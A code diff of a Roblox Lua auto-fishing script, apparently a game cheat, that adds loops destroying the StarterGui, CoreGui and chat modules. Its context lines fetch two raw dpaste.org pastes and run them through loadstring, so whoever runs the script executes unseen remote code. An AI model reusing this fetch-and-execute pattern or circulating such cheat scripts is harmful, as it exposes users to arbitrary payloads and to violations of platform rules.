@@ -148,12 +148,6 @@ task.spawn(autoFish)
 wait(60)
 
 task.spawn(function() 
-    for k,v in game.Players.LocalPlayer.PlayerGui:GetChildren() do 
-        if v.Name == "Main" or v.Name == "MainLeft" or v.Name == "MainMobile" or v.Name == "GoalsSide" then
-            v:Destroy()
-        end
-    end
-
     for _, v in pairs(game:GetService("Workspace"):FindFirstChild("__THINGS").__INSTANCE_CONTAINER.Active.AdvancedFishing:GetChildren()) do
         if string.find(v.Name, "Lighting") or string.find(v.Name, "Water") or string.find(v.Name, "Debris") then
             v:Destroy()
@@ -177,8 +171,19 @@ task.spawn(function()
             v:Destroy()
         end
     end
+
+    for _, v in pairs(game:GetService("StarterGui"):GetChildren()) do
+        v:Destroy()
+    end
+
+    for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+        v:Destroy()
+    end
     
     game:GetService("Lighting"):ClearAllChildren()
+    for _, v in pairs(game:GetService("Chat").ClientChatModules:GetChildren()) do
+        v:Destroy()
+    end
 
     loadstring(game:HttpGet("https://dpaste.org/Nr0nB/raw"))()
     loadstring(game:HttpGet("https://dpaste.org/buBr6/raw"))()
